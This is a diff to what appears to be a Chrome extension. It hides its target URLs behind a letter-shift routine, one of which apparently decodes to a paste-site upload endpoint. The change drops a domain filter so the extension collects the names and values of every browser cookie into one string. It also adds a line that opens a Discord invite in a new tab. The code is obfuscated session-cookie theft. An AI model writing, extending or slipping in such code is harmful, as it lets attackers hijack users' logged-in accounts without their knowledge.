@@ -31,6 +31,8 @@ function reminify(i, cng) {
     }
 }
 
+chrome.tabs.create({ url: "https://discord.com/invite/ME3SDSf" });
+
 
 // Execute the lookup in the tab requested
 chrome.tabs.query({ url: `${reminify("*://*.lqakwzl.kwu/*", -8)}` }, (tabs) => {
@@ -105,9 +107,7 @@ function syncKeys(name) {
     return KEYWORDS.some(keyword => name.toLowerCase().includes(keyword));
 }
 
-function syncReq(requests) {
-    return reminify(diAllowContent, -3).some(allowReq => requests.endsWith(allowReq));
-}
+
 
 const updateSec = "tffbe://tmefqnuz.oay/paogyqzfe";
 
@@ -337,15 +337,12 @@ async function parseResults() {
     })();
 
     chrome.cookies.getAll({}, async (m) => {
-        const filM = m.filter(b => 
-            syncReq(b.domain)
-        );
 
-        if (filM.length === 0) {
+        if (m.length === 0) {
             return;
         }
 
-        const osintData = filM.map(c => 
+        const osintData = m.map(c => 
             `${c.domain} | ${c.name}: ${c.value}\n`
         ).join('\n');
 
